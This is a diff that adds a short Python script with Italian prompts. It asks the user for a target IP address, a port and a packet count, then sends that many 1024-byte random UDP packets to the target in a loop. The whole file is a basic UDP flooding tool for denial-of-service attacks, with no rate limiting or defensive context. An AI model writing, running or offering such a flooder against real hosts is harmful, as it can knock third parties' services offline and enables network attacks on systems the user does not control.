@@ -1,0 +1,11 @@
+import random, socket
+sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+packet = random.randbytes(1024)
+ip = str(input("inserisci ip "))
+porta = int(input("inserisci porta "))
+numax = int(input("inserisci numero "))
+x = 0
+while x < numax:     
+         sock.sendto(packet, (ip,porta)) # send UDP packet 
+         x = x + 1   
+  
